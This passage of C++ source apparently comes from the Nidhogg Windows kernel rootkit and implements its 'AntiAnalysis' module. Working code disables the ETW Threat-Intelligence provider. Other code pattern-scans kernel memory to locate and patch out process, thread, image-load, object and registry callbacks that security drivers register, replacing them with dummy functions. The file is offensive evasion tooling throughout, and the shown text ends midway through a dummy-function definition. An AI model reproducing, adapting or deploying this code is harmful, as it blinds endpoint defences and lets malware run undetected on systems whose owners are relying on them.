#include "pch.h"
#include "AntiAnalysis.hpp"

AntiAnalysis::AntiAnalysis() {
	this->PrevEtwTiValue = 0;
	this->DisabledCallbacksCount = 0;

	memset(this->DisabledCallbacks, 0, sizeof(this->DisabledCallbacks));
	this->DisabledCallbacksCount = 0;

	this->Lock.Init();
}

AntiAnalysis::~AntiAnalysis() {
	AutoLock locker(this->Lock);
	memset(this->DisabledCallbacks, 0, sizeof(this->DisabledCallbacks));
	this->DisabledCallbacksCount = 0;
}

/*
* Description:
* EnableDisableEtwTI is responsible to enable or disable ETWTI.
*
* Parameters:
* @enable	[bool]	   -- Whether to enable or disable ETWTI.
*
* Returns:
* @status	[NTSTATUS] -- Whether successfuly enabled or disabled.
*/
NTSTATUS AntiAnalysis::EnableDisableEtwTI(bool enable) {
	NTSTATUS status = STATUS_SUCCESS;
	EX_PUSH_LOCK etwThreatIntLock = NULL;
	ULONG foundIndex = 0;
	SIZE_T bytesWritten = 0;
	SIZE_T etwThreatIntProvRegHandleSigLen = sizeof(EtwThreatIntProvRegHandleSignature1);
	UCHAR* etwThreatIntProvRegHandleSig = (UCHAR*)ExAllocatePoolWithTag(PagedPool, etwThreatIntProvRegHandleSigLen, DRIVER_TAG);

	if (!etwThreatIntProvRegHandleSig)
		return STATUS_INSUFFICIENT_RESOURCES;
	RtlCopyMemory(etwThreatIntProvRegHandleSig, EtwThreatIntProvRegHandleSignature1, etwThreatIntProvRegHandleSigLen);

	AutoLock lock(this->Lock);
	PVOID searchedRoutineAddress = (PVOID)KeInsertQueueApc;
	SIZE_T targetFunctionDistance = EtwThreatIntProvRegHandleDistance;
	PLONG searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)etwThreatIntProvRegHandleSig, 0xCC, etwThreatIntProvRegHandleSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)etwThreatIntProvRegHandleSigLen);

	if (!searchedRoutineOffset) {
		RtlCopyMemory(etwThreatIntProvRegHandleSig, EtwThreatIntProvRegHandleSignature2, etwThreatIntProvRegHandleSigLen);
		searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)etwThreatIntProvRegHandleSig, 0xCC, etwThreatIntProvRegHandleSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)etwThreatIntProvRegHandleSigLen);

		if (!searchedRoutineOffset) {
			status = STATUS_NOT_FOUND;
			goto Cleanup;
		}
	}
	PUCHAR etwThreatIntProvRegHandle = (PUCHAR)searchedRoutineAddress + (*searchedRoutineOffset) + foundIndex + EtwThreatIntProvRegHandleOffset;
	ULONG enableProviderInfoOffset = GetEtwProviderEnableInfoOffset();

	if (enableProviderInfoOffset == (ULONG)STATUS_UNSUCCESSFUL) {
		status = STATUS_UNSUCCESSFUL;
		goto Cleanup;
	}
	PTRACE_ENABLE_INFO enableProviderInfo = (PTRACE_ENABLE_INFO)(etwThreatIntProvRegHandle + EtwGuidEntryOffset + enableProviderInfoOffset);
	ULONG lockOffset = GetEtwGuidLockOffset();

	if (lockOffset != (ULONG)STATUS_UNSUCCESSFUL) {
		etwThreatIntLock = (EX_PUSH_LOCK)(etwThreatIntProvRegHandle + EtwGuidEntryOffset + lockOffset);
		ExAcquirePushLockExclusiveEx(&etwThreatIntLock, 0);
	}

	if (enable) {
		MmCopyVirtualMemory(PsGetCurrentProcess(), &this->PrevEtwTiValue, PsGetCurrentProcess(), &enableProviderInfo->IsEnabled, sizeof(ULONG), KernelMode, &bytesWritten);
		this->PrevEtwTiValue = 0;
	}
	else {
		ULONG disableEtw = 0;
		status = NidhoggMemoryUtils->KeReadProcessMemory(PsGetCurrentProcess(), &enableProviderInfo->IsEnabled, &this->PrevEtwTiValue, sizeof(ULONG), KernelMode);

		if (NT_SUCCESS(status))
			status = MmCopyVirtualMemory(PsGetCurrentProcess(), &disableEtw, PsGetCurrentProcess(), &enableProviderInfo->IsEnabled, sizeof(ULONG), KernelMode, &bytesWritten);
	}

	if (etwThreatIntLock)
		ExReleasePushLockExclusiveEx(&etwThreatIntLock, 0);

Cleanup:
	if (etwThreatIntProvRegHandleSig)
		ExFreePoolWithTag(etwThreatIntProvRegHandleSig, DRIVER_TAG);
	return status;
}

/*
* Description:
* RestoreObCallback is responsible to restoring a certain callback from the callback list.
*
* Parameters:
* @Callback [KernelCallback*] -- Callback to remove.
*
* Returns:
* @status	[NTSTATUS]		  -- Whether successfuly restored or not.
*/
NTSTATUS AntiAnalysis::RestoreCallback(KernelCallback* Callback) {
	DisabledKernelCallback callback{};
	NTSTATUS status = STATUS_NOT_FOUND;

	AutoLock locker(this->Lock);
	status = RemoveDisabledCallback(Callback, &callback);

	if (!NT_SUCCESS(status))
		return status;

	if (Callback->Type == ObProcessType || Callback->Type == ObThreadType) {
		PFULL_OBJECT_TYPE objectType = NULL;

		switch (Callback->Type) {
		case ObProcessType:
			objectType = (PFULL_OBJECT_TYPE)*PsProcessType;
			break;
		case ObThreadType:
			objectType = (PFULL_OBJECT_TYPE)*PsThreadType;
			break;
		}

		ExAcquirePushLockExclusive((PULONG_PTR)&objectType->TypeLock);
		POB_CALLBACK_ENTRY currentObjectCallback = (POB_CALLBACK_ENTRY)(&objectType->CallbackList);

		do {
			if (currentObjectCallback->Enabled && (ULONG64)currentObjectCallback->Entry == callback.Entry) {
				if (currentObjectCallback->PreOperation == ObPreOpenDummyFunction) {
					currentObjectCallback->PreOperation = (POB_PRE_OPERATION_CALLBACK)callback.CallbackAddress;
					status = STATUS_SUCCESS;
					break;
				}
				else if (currentObjectCallback->PostOperation == ObPostOpenDummyFunction) {
					currentObjectCallback->PostOperation = (POB_POST_OPERATION_CALLBACK)callback.CallbackAddress;
					status = STATUS_SUCCESS;
					break;
				}
			}
			currentObjectCallback = (POB_CALLBACK_ENTRY)currentObjectCallback->CallbackList.Flink;
		} while ((PVOID)currentObjectCallback != (PVOID)(&objectType->CallbackList));

		ExReleasePushLockExclusive((PULONG_PTR)&objectType->TypeLock);
	}
	else if (Callback->Type == PsCreateProcessType || Callback->Type == PsCreateProcessTypeEx ||
		Callback->Type == PsCreateThreadType || Callback->Type == PsCreateThreadTypeNonSystemThread) {
		PsRoutinesList routines{};
		ULONG64 replacedFunction = 0;
		routines.Type = Callback->Type;

		switch (Callback->Type) {
		case PsCreateProcessType:
			replacedFunction = (ULONG64)CreateProcessNotifyDummyFunction;
			break;
		case PsCreateProcessTypeEx:
			replacedFunction = (ULONG64)CreateProcessNotifyExDummyFunction;
			break;
		case PsCreateThreadType:
		case PsCreateThreadTypeNonSystemThread:
			replacedFunction = (ULONG64)CreateThreadNotifyDummyFunction;
			break;
		case PsImageLoadType:
			replacedFunction = (ULONG64)LoadImageNotifyDummyFunction;
			break;
		}

		status = ListPsNotifyRoutines(&routines, Callback->CallbackAddress, replacedFunction);
	}
	else if (Callback->Type == CmRegistryType) {
		CmCallbacksList callbacks{};
		ULONG64 replacedFunction = (ULONG64)RegistryCallbackDummyFunction;

		status = ListRegistryCallbacks(&callbacks, Callback->CallbackAddress, replacedFunction);
	}

	return status;
}

/*
* Description:
* RemoveObCallback is responsible to remove a certain callback from the callback list.
*
* Parameters:
* @Callback [KernelCallback*] -- Callback to remove.
*
* Returns:
* @status	[NTSTATUS]		  -- Whether successfuly removed or not.
*/
NTSTATUS AntiAnalysis::RemoveCallback(KernelCallback* Callback) {
	DisabledKernelCallback callback{};
	NTSTATUS status = STATUS_NOT_FOUND;

	if (Callback->Type == ObProcessType || Callback->Type == ObThreadType) {
		PFULL_OBJECT_TYPE objectType = NULL;
		ULONG64 operationAddress = 0;

		switch (Callback->Type) {
		case ObProcessType:
			objectType = (PFULL_OBJECT_TYPE)*PsProcessType;
			break;
		case ObThreadType:
			objectType = (PFULL_OBJECT_TYPE)*PsThreadType;
			break;
		}

		ExAcquirePushLockExclusive((PULONG_PTR)&objectType->TypeLock);
		POB_CALLBACK_ENTRY currentObjectCallback = (POB_CALLBACK_ENTRY)(&objectType->CallbackList);

		do {
			if (currentObjectCallback->Enabled) {
				if ((ULONG64)currentObjectCallback->PreOperation == Callback->CallbackAddress) {
					operationAddress = (ULONG64)currentObjectCallback->PreOperation;
					currentObjectCallback->PreOperation = ObPreOpenDummyFunction;
				}
				else if ((ULONG64)currentObjectCallback->PostOperation == Callback->CallbackAddress) {
					operationAddress = (ULONG64)currentObjectCallback->PostOperation;
					currentObjectCallback->PostOperation = ObPostOpenDummyFunction;
				}

				if (operationAddress) {
					callback.CallbackAddress = operationAddress;
					callback.Entry = (ULONG64)currentObjectCallback->Entry;
					callback.Type = Callback->Type;
					break;
				}
			}
			currentObjectCallback = (POB_CALLBACK_ENTRY)currentObjectCallback->CallbackList.Flink;
		} while ((PVOID)currentObjectCallback != (PVOID)(&objectType->CallbackList));

		ExReleasePushLockExclusive((PULONG_PTR)&objectType->TypeLock);
	}
	else if (Callback->Type == PsCreateProcessType || Callback->Type == PsCreateProcessTypeEx ||
		Callback->Type == PsCreateThreadType || Callback->Type == PsCreateThreadTypeNonSystemThread ||
		Callback->Type == PsImageLoadType) {
		PsRoutinesList routines{};
		ULONG64 replacerFunction = 0;
		routines.Type = Callback->Type;

		switch (Callback->Type) {
		case PsCreateProcessType:
			replacerFunction = (ULONG64)CreateProcessNotifyDummyFunction;
			break;
		case PsCreateProcessTypeEx:
			replacerFunction = (ULONG64)CreateProcessNotifyExDummyFunction;
			break;
		case PsCreateThreadType:
		case PsCreateThreadTypeNonSystemThread:
			replacerFunction = (ULONG64)CreateThreadNotifyDummyFunction;
			break;
		case PsImageLoadType:
			replacerFunction = (ULONG64)LoadImageNotifyDummyFunction;
			break;
		}

		status = ListPsNotifyRoutines(&routines, replacerFunction, Callback->CallbackAddress);
		callback.CallbackAddress = Callback->CallbackAddress;
		callback.Type = Callback->Type;
	}
	else if (Callback->Type == CmRegistryType) {
		CmCallbacksList callbacks{};
		ULONG64 replacerFunction = (ULONG64)RegistryCallbackDummyFunction;

		status = ListRegistryCallbacks(&callbacks, replacerFunction, Callback->CallbackAddress);
		callback.CallbackAddress = Callback->CallbackAddress;
		callback.Type = Callback->Type;
	}

	if (NT_SUCCESS(status)) {
		AutoLock locker(this->Lock);
		status = AddDisabledCallback(callback);
	}

	return status;
}

/*
* Description:
* ListRegistryCallbacks is responsible to list all registered registry callbacks.
*
* Parameters:
* @Callbacks	    [CallbacksList*] -- All callbacks as list.
* @ReplacerFunction [ULONG64]		 -- If not null, the address of the function to replace.
* @ReplacedFunction [ULONG64]		 -- If not null, the address of the function to be replaced.
*
* Returns:
* @status		    [NTSTATUS]		 -- Whether successfuly listed or not.
*/
NTSTATUS AntiAnalysis::ListRegistryCallbacks(CmCallbacksList* Callbacks, ULONG64 ReplacerFunction, ULONG64 ReplacedFunction) {
	NTSTATUS status = STATUS_SUCCESS;
	UCHAR* listHeadSignature = NULL;
	UCHAR* listHeadCountSignature = NULL;
	UCHAR* callbacksListLockSignature = NULL;
	UCHAR* mainFunctionSignature = NULL;
	PCM_CALLBACK currentCallback = NULL;
	ULONG foundIndex = 0;
	CHAR driverName[MAX_DRIVER_PATH] = { 0 };

	// Find CmpRegisterCallbackInternal.
	SIZE_T targetFunctionSigLen = sizeof(CallFunctionSignature);
	UCHAR* targetFunctionSignature = (UCHAR*)ExAllocatePoolWithTag(PagedPool, targetFunctionSigLen, DRIVER_TAG);

	if (!targetFunctionSignature) {
		status = STATUS_INSUFFICIENT_RESOURCES;
		goto Cleanup;
	}
	RtlCopyMemory(targetFunctionSignature, CallFunctionSignature, targetFunctionSigLen);

	PVOID searchedRoutineAddress = (PVOID)CmRegisterCallback;
	SIZE_T targetFunctionDistance = CmpRegisterCallbackInternalSignatureDistance;

	PLONG searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)targetFunctionSignature, 0xCC, targetFunctionSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(targetFunctionSigLen - 1));

	if (!searchedRoutineOffset) {
		status = STATUS_NOT_FOUND;
		goto Cleanup;
	}

	// Find the function that holds the valuable information: CmpInsertCallbackInListByAltitude.
	searchedRoutineAddress = (PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex + CallFunctionOffset;
	targetFunctionSigLen = sizeof(CmpInsertCallbackInListByAltitudeSignature);
	mainFunctionSignature = (UCHAR*)ExAllocatePoolWithTag(PagedPool, targetFunctionSigLen, DRIVER_TAG);

	if (!mainFunctionSignature) {
		status = STATUS_INSUFFICIENT_RESOURCES;
		goto Cleanup;
	}
	RtlCopyMemory(mainFunctionSignature, CmpInsertCallbackInListByAltitudeSignature, targetFunctionSigLen);
	targetFunctionDistance = CmpInsertCallbackInListByAltitudeSignatureDistance;

	searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)mainFunctionSignature, 0xCC, targetFunctionSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(targetFunctionSigLen - 1));

	if (!searchedRoutineOffset) {
		status = STATUS_NOT_FOUND;
		goto Cleanup;
	}
	searchedRoutineAddress = (PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex + CmpInsertCallbackInListByAltitudeOffset;

	// Get CallbackListHead and CmpCallBackCount.
	SIZE_T listHeadSignatureLen = sizeof(CallbackListHeadSignature);
	targetFunctionDistance = CallbackListHeadSignatureDistance;
	listHeadSignature = (UCHAR*)ExAllocatePoolWithTag(PagedPool, listHeadSignatureLen, DRIVER_TAG);

	if (!listHeadSignature) {
		status = STATUS_INSUFFICIENT_RESOURCES;
		goto Cleanup;
	}
	RtlCopyMemory(listHeadSignature, CallbackListHeadSignature, listHeadSignatureLen);

	SIZE_T listHeadCountSignatureLen = sizeof(RoutinesListCountSignature);
	listHeadCountSignature = (UCHAR*)ExAllocatePoolWithTag(PagedPool, listHeadCountSignatureLen, DRIVER_TAG);

	if (!listHeadCountSignature) {
		status = STATUS_INSUFFICIENT_RESOURCES;
		goto Cleanup;
	}
	RtlCopyMemory(listHeadCountSignature, RoutinesListCountSignature, listHeadCountSignatureLen);

	searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)listHeadSignature, 0xCC, listHeadSignatureLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)listHeadSignatureLen);

	if (!searchedRoutineOffset) {
		status = STATUS_NOT_FOUND;
		goto Cleanup;
	}
	PUCHAR callbacksList = (PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex + RoutinesListOffset;

	searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)listHeadCountSignature, 0xCC, listHeadCountSignatureLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(listHeadCountSignatureLen - 1));

	if (!searchedRoutineOffset) {
		status = STATUS_NOT_FOUND;
		goto Cleanup;
	}
	ULONG callbacksListCount = *(PLONG)((PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex + CallbacksListCountOffset);

	// Get CmpCallbackListLock.
	SIZE_T callbacksListLockSignatureLen = sizeof(CmpCallbackListLockSignature);
	callbacksListLockSignature = (UCHAR*)ExAllocatePoolWithTag(PagedPool, callbacksListLockSignatureLen, DRIVER_TAG);

	if (!callbacksListLockSignature) {
		status = STATUS_INSUFFICIENT_RESOURCES;
		goto Cleanup;
	}
	RtlCopyMemory(callbacksListLockSignature, CmpCallbackListLockSignature, callbacksListLockSignatureLen);

	searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)callbacksListLockSignature, 0xCC, callbacksListLockSignatureLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(callbacksListLockSignatureLen - 1));

	if (!searchedRoutineOffset) {
		status = STATUS_NOT_FOUND;
		goto Cleanup;
	}
	ULONG_PTR callbackListLock = (ULONG_PTR)((PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex + CmpCallbackListLockOffset);

	ExAcquirePushLockExclusiveEx(&callbackListLock, 0);

	currentCallback = (PCM_CALLBACK)callbacksList;

	for (ULONG i = 0; i < callbacksListCount; i++) {
		if (ReplacedFunction && ReplacerFunction) {
			if (currentCallback->Function == ReplacedFunction)
				currentCallback->Function = ReplacerFunction;
		}
		else {
			Callbacks->Callbacks[i].CallbackAddress = (ULONG64)currentCallback->Function;
			Callbacks->Callbacks[i].Context = currentCallback->Context;

			if (NT_SUCCESS(MatchCallback((PVOID)Callbacks->Callbacks[i].CallbackAddress, driverName)))
				strcpy_s(Callbacks->Callbacks[i].DriverName, driverName);
		}
		currentCallback = (PCM_CALLBACK)currentCallback->List.Flink;
	}
	ExReleasePushLockExclusiveEx(&callbackListLock, 0);

	if (!ReplacedFunction && !ReplacerFunction)
		Callbacks->NumberOfCallbacks = callbacksListCount;

Cleanup:
	if (callbacksListLockSignature)
		ExFreePoolWithTag(callbacksListLockSignature, DRIVER_TAG);
	if (listHeadCountSignature)
		ExFreePoolWithTag(listHeadCountSignature, DRIVER_TAG);
	if (listHeadSignature)
		ExFreePoolWithTag(listHeadSignature, DRIVER_TAG);
	if (targetFunctionSignature)
		ExFreePoolWithTag(targetFunctionSignature, DRIVER_TAG);
	return status;
}

/*
* Description:
* ListPsNotifyRoutines is responsible to list all registered PsNotify routines.
*
* Parameters:
* @Callbacks	    [CallbacksList*] -- All callbacks as list.
* @ReplacerFunction [ULONG64]		 -- If not null, the address of the function to replace.
* @ReplacedFunction [ULONG64]		 -- If not null, the address of the function to be replaced.
*
* Returns:
* @status		    [NTSTATUS]		 -- Whether successfuly listed or not.
*/
NTSTATUS AntiAnalysis::ListPsNotifyRoutines(PsRoutinesList* Callbacks, ULONG64 ReplacerFunction, ULONG64 ReplacedFunction) {
	NTSTATUS status = STATUS_SUCCESS;
	PVOID searchedRoutineAddress = NULL;
	UCHAR* targetFunctionSignature = NULL;
	UCHAR* listSignature = NULL;
	UCHAR* listCountSignature = NULL;
	ULONG foundIndex = 0;
	SIZE_T targetFunctionDistance = 0;
	SIZE_T listDistance = 0;
	SIZE_T targetFunctionSigLen = 0;
	SIZE_T listSigLen = 0;
	SIZE_T listCountSigLen = 0;
	SIZE_T countOffset = 0;
	ULONG64 currentRoutine = 0;

	CHAR driverName[MAX_DRIVER_PATH] = { 0 };

	switch (Callbacks->Type) {
	case PsCreateProcessTypeEx:
	case PsCreateProcessType: {
		searchedRoutineAddress = (PVOID)PsSetCreateProcessNotifyRoutineEx;
		targetFunctionDistance = PspSetCreateProcessNotifyRoutineSignatureDistance;

		listSigLen = sizeof(PspCreateProcessNotifyRoutineSignature);
		listSignature = (UCHAR*)ExAllocatePoolWithTag(PagedPool, listSigLen, DRIVER_TAG);

		if (!listSignature) {
			status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		RtlCopyMemory(listSignature, PspCreateProcessNotifyRoutineSignature, listSigLen);
		listDistance = PspCreateProcessNotifyRoutineDistance;
		break;
	}
	case PsCreateThreadType:
	case PsCreateThreadTypeNonSystemThread:
	{
		searchedRoutineAddress = (PVOID)PsSetCreateThreadNotifyRoutine;
		targetFunctionDistance = PspSetCreateThreadNotifyRoutineSignatureDistance;

		listSigLen = sizeof(PspCreateThreadNotifyRoutineSignature);
		listSignature = (UCHAR*)ExAllocatePoolWithTag(PagedPool, listSigLen, DRIVER_TAG);

		if (!listSignature) {
			status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		RtlCopyMemory(listSignature, PspCreateThreadNotifyRoutineSignature, listSigLen);
		listDistance = PspCreateThreadNotifyRoutineDistance;
		break;
	}
	case PsImageLoadType:
	{
		searchedRoutineAddress = (PVOID)PsSetLoadImageNotifyRoutine;
		targetFunctionDistance = PsSetLoadImageNotifyRoutineExDistance;

		listSigLen = sizeof(PspLoadImageNotifyRoutineSignature);
		listSignature = (UCHAR*)ExAllocatePoolWithTag(PagedPool, listSigLen, DRIVER_TAG);

		if (!listSignature) {
			status = STATUS_INSUFFICIENT_RESOURCES;
			break;
		}

		RtlCopyMemory(listSignature, PspLoadImageNotifyRoutineSignature, listSigLen);
		listDistance = PspLoadImageNotifyRoutineDistance;
		break;
	}
	default:
		status = STATUS_INVALID_PARAMETER;
		break;
	}

	if (!NT_SUCCESS(status))
		goto Cleanup;

	targetFunctionSigLen = sizeof(CallFunctionSignature);
	targetFunctionSignature = (UCHAR*)ExAllocatePoolWithTag(PagedPool, targetFunctionSigLen, DRIVER_TAG);

	if (!targetFunctionSignature) {
		status = STATUS_INSUFFICIENT_RESOURCES;
		goto Cleanup;
	}
	RtlCopyMemory(targetFunctionSignature, CallFunctionSignature, targetFunctionSigLen);

	listCountSigLen = sizeof(RoutinesListCountSignature);
	listCountSignature = (UCHAR*)ExAllocatePoolWithTag(PagedPool, listCountSigLen, DRIVER_TAG);

	if (!listCountSignature) {
		status = STATUS_INSUFFICIENT_RESOURCES;
		goto Cleanup;
	}
	RtlCopyMemory(listCountSignature, RoutinesListCountSignature, listCountSigLen);
	countOffset = RoutinesListOffset;

	PLONG searchedRoutineOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)targetFunctionSignature, 0xCC, targetFunctionSigLen - 1, searchedRoutineAddress, targetFunctionDistance, &foundIndex, (ULONG)(targetFunctionSigLen - 1));

	if (!searchedRoutineOffset) {
		status = STATUS_NOT_FOUND;
		goto Cleanup;
	}

	searchedRoutineAddress = (PUCHAR)searchedRoutineAddress + *(searchedRoutineOffset)+foundIndex + CallFunctionOffset;

	PLONG routinesListOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)listSignature, 0xCC, listSigLen - 1, searchedRoutineAddress, listDistance, &foundIndex, (ULONG)listSigLen);

	if (!routinesListOffset) {
		status = STATUS_NOT_FOUND;
		goto Cleanup;
	}

	PUCHAR routinesList = (PUCHAR)searchedRoutineAddress + *(routinesListOffset)+foundIndex + RoutinesListOffset;

	PLONG routinesLengthOffset = (PLONG)NidhoggMemoryUtils->FindPattern((PCUCHAR)listCountSignature, 0xCC, listCountSigLen - 1, searchedRoutineAddress, listDistance, &foundIndex, (ULONG)(listCountSigLen - 1));

	if (!routinesLengthOffset) {
		status = STATUS_NOT_FOUND;
		goto Cleanup;
	}

	if (Callbacks->Type == PsCreateProcessType)
		countOffset = PsNotifyRoutinesRoutineCountOffset;
	else if (Callbacks->Type == PsCreateThreadTypeNonSystemThread)
		countOffset = PsNotifyRoutinesRoutineCountOffset;

	ULONG routinesCount = *(PLONG)((PUCHAR)searchedRoutineAddress + *(routinesLengthOffset)+foundIndex + countOffset);

	for (SIZE_T i = 0; i < routinesCount; i++) {
		currentRoutine = *(PULONG64)(routinesList + (i * 8));
		currentRoutine &= ~(1ULL << 3) + 1;

		if (ReplacedFunction && ReplacerFunction) {
			if (*(PULONG64)(currentRoutine) == ReplacedFunction)
				*(PULONG64)(currentRoutine) = ReplacerFunction;
		}
		else {
			Callbacks->Routines[i].CallbackAddress = *(PULONG64)(currentRoutine);

			if (NT_SUCCESS(MatchCallback((PVOID)Callbacks->Routines[i].CallbackAddress, driverName)))
				strcpy_s(Callbacks->Routines[i].DriverName, driverName);
		}
	}

	if (!ReplacedFunction && !ReplacerFunction)
		Callbacks->NumberOfRoutines = routinesCount;

Cleanup:
	if (listCountSignature)
		ExFreePoolWithTag(listCountSignature, DRIVER_TAG);
	if (listSignature)
		ExFreePoolWithTag(listSignature, DRIVER_TAG);
	if (targetFunctionSignature)
		ExFreePoolWithTag(targetFunctionSignature, DRIVER_TAG);
	return status;
}

/*
* Description:
* ListObCallbacks is responsible to list all registered ObCallbacks of certain type.
*
* Parameters:
* @Callbacks [CallbacksList*]	-- All callbacks as list.
*
* Returns:
* @status	 [NTSTATUS]			-- Whether successfuly listed or not.
*/
NTSTATUS AntiAnalysis::ListObCallbacks(ObCallbacksList* Callbacks) {
	NTSTATUS status = STATUS_SUCCESS;
	PFULL_OBJECT_TYPE objectType = NULL;
	CHAR driverName[MAX_DRIVER_PATH] = { 0 };
	ULONG index = 0;

	switch (Callbacks->Type) {
	case ObProcessType:
		objectType = (PFULL_OBJECT_TYPE)*PsProcessType;
		break;
	case ObThreadType:
		objectType = (PFULL_OBJECT_TYPE)*PsThreadType;
		break;
	default:
		status = STATUS_INVALID_PARAMETER;
		break;
	}

	if (!NT_SUCCESS(status))
		return status;

	ExAcquirePushLockExclusive((PULONG_PTR)&objectType->TypeLock);
	POB_CALLBACK_ENTRY currentObjectCallback = (POB_CALLBACK_ENTRY)(&objectType->CallbackList);

	if (Callbacks->NumberOfCallbacks == 0) {
		do {
			if (currentObjectCallback->Enabled) {
				if (currentObjectCallback->PostOperation || currentObjectCallback->PreOperation)
					Callbacks->NumberOfCallbacks++;
			}
			currentObjectCallback = (POB_CALLBACK_ENTRY)currentObjectCallback->CallbackList.Flink;
		} while ((PVOID)currentObjectCallback != (PVOID)(&objectType->CallbackList));
	}
	else {
		do {
			if (currentObjectCallback->Enabled) {
				if (currentObjectCallback->PostOperation) {
					if (NT_SUCCESS(MatchCallback(currentObjectCallback->PostOperation, driverName)))
						strcpy_s(Callbacks->Callbacks[index].DriverName, driverName);

					Callbacks->Callbacks[index].PostOperation = currentObjectCallback->PostOperation;
				}
				if (currentObjectCallback->PreOperation) {
					if (NT_SUCCESS(MatchCallback(currentObjectCallback->PreOperation, driverName)))
						if (strlen(Callbacks->Callbacks[index].DriverName) == 0)
							strcpy_s(Callbacks->Callbacks[index].DriverName, driverName);

					Callbacks->Callbacks[index].PreOperation = currentObjectCallback->PreOperation;
				}
				index++;
			}
			currentObjectCallback = (POB_CALLBACK_ENTRY)currentObjectCallback->CallbackList.Flink;
		} while (index != Callbacks->NumberOfCallbacks && (PVOID)currentObjectCallback != (PVOID)(&objectType->CallbackList));
	}
	ExReleasePushLockExclusive((PULONG_PTR)&objectType->TypeLock);
	return status;
}

/*
* Description:
* MatchCallback is responsible to match the callback to its driver.
*
* Parameters:
* @callack	  [PVOID]    -- Callback's address.
* @driverName [PCHAR]    -- Pointer to the driver name if found, else null.
*
* Returns:
* @status	  [NTSTATUS] -- Whether successfuly matched or not.
*/
NTSTATUS AntiAnalysis::MatchCallback(PVOID callack, CHAR driverName[MAX_DRIVER_PATH]) {
	NTSTATUS status = STATUS_SUCCESS;
	PRTL_PROCESS_MODULES info = NULL;
	ULONG infoSize;

	status = ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &infoSize);

	while (status == STATUS_INFO_LENGTH_MISMATCH) {
		if (info) {
			ExFreePoolWithTag(info, DRIVER_TAG);
			info = NULL;
		}

		info = (PRTL_PROCESS_MODULES)ExAllocatePoolWithTag(PagedPool, infoSize, DRIVER_TAG);

		if (!info)
			return STATUS_INSUFFICIENT_RESOURCES;

		status = ZwQuerySystemInformation(SystemModuleInformation, info, infoSize, &infoSize);
	}

	if (!NT_SUCCESS(status) || !info)
		goto CleanUp;

	PRTL_PROCESS_MODULE_INFORMATION modules = info->Modules;

	for (ULONG i = 0; i < info->NumberOfModules; i++) {
		if (callack >= modules[i].ImageBase && callack < (PVOID)((PUCHAR)modules[i].ImageBase + modules[i].ImageSize)) {
			if (modules[i].FullPathName)
				strcpy_s(driverName, MAX_DRIVER_PATH, (const char*)modules[i].FullPathName);
			else
				status = STATUS_UNSUCCESSFUL;
			break;
		}
	}

CleanUp:
	if (info)
		ExFreePoolWithTag(info, DRIVER_TAG);
	return status;
}

/*
* Description:
* AddDisabledCallback is responsible for adding a disabled callback to the list of disabled callbacks.
*
* Parameters:
* @Callback	  [DisabledKernelCallback] -- Callback to add.
*
* Returns:
* @status	  [NTSTATUS]			   -- STATUS_SUCCESS if succeeded else the error.
*/
NTSTATUS AntiAnalysis::AddDisabledCallback(DisabledKernelCallback Callback) {
	NTSTATUS status = STATUS_UNSUCCESSFUL;

	for (int i = 0; i < MAX_KERNEL_CALLBACKS; i++) {
		if (!this->DisabledCallbacks[i].CallbackAddress) {
			this->DisabledCallbacks[i].CallbackAddress = Callback.CallbackAddress;
			this->DisabledCallbacks[i].Entry = Callback.Entry;
			this->DisabledCallbacks[i].Type = Callback.Type;
			this->DisabledCallbacksCount++;
			status = STATUS_SUCCESS;
			break;
		}
	}

	return status;
}

/*
* Description:
* RemoveDisabledCallback is responsible for removing a disabled callback to the list of disabled callbacks.
*
* Parameters:
* @Callback			  [KernelCallback*]	  -- Callback to search.
* @DisabledCallback	  [DisabledCallback*] -- Output callback.
*
* Returns:
* @status			  [NTSTATUS]		  -- STATUS_SUCCESS if succeeded else the error.
*/
NTSTATUS AntiAnalysis::RemoveDisabledCallback(KernelCallback* Callback, DisabledKernelCallback* DisabledCallback) {
	NTSTATUS status = STATUS_UNSUCCESSFUL;

	for (ULONG i = 0; i < this->DisabledCallbacksCount; i++) {
		if (this->DisabledCallbacks[i].CallbackAddress == Callback->CallbackAddress) {
			DisabledCallback->CallbackAddress = this->DisabledCallbacks[i].CallbackAddress;
			DisabledCallback->Entry = this->DisabledCallbacks[i].Entry;
			DisabledCallback->Type = this->DisabledCallbacks[i].Type;
			this->DisabledCallbacksCount--;
			status = STATUS_SUCCESS;
			break;
		}
	}

	return status;
}


/*
* Description:
* ObPreOpenDummyFunction is a dummy function for pre ob callbacks.
*
* Parameters:
* @RegistrationContext [PVOID]						   -- Unused.
* @Info				   [POB_PRE_OPERATION_INFORMATION] -- Unused.
*
* Returns:
* @status			   [NTSTATUS]					   -- Always OB_PREOP_SUCCESS.
*/
OB_PREOP_CALLBACK_STATUS ObPreOpenDummyFunction(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info) {
	UNREFERENCED_PARAMETER(RegistrationContext);
